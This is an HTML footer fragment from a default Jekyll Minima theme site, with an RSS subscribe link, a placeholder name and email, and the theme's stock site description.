    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">GitHub User</li>
          <li><a class="u-email" href="mailto:your-email@domain.com">your-email@domain.com</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
